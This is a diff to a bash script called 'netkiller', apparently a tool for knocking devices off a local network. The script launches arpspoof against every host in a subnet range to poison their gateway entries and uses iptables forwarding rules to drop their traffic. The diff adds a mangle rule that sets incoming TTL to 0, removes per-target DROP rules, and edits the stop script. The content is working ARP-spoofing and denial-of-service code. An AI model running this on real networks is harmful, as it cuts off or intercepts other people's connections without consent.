@@ -90,18 +90,20 @@ else
     echo "[*] Skipping..."
 fi
 
-# Enable IP forwarding
+# Enable IP forwarding and blocking rules
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -P FORWARD DROP
+iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0
 
 # Create stop script
 cat > /bin/netkiller-stop << 'EOF'
 #!/bin/sh
 
-echo ""
+echo " "
 echo "Netkiller is stopped!"
-echo ""
+echo " "
 ip -s -s neigh flush all >/dev/null 2>&1
+iptables -t mangle -A PREROUTING -i $INTERFACE -j TTL --ttl-set 64
 iptables -P FORWARD ACCEPT
 iptables -F FORWARD
 pkill -f arpspoof
@@ -135,10 +137,6 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     END=$(ip2int "$HOSTMAX")
     for ((i=START; i<=END; i++)); do
         TARGET_IP=$(int2ip "$i")
-
-        # Block all the traffic except the DEVICE IP and GATEWAY
-        iptables -A FORWARD -s "$TARGET_IP" -j DROP
-        iptables -A FORWARD -d "$TARGET_IP" -j DROP
         ( arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 ) &
     done
 fi
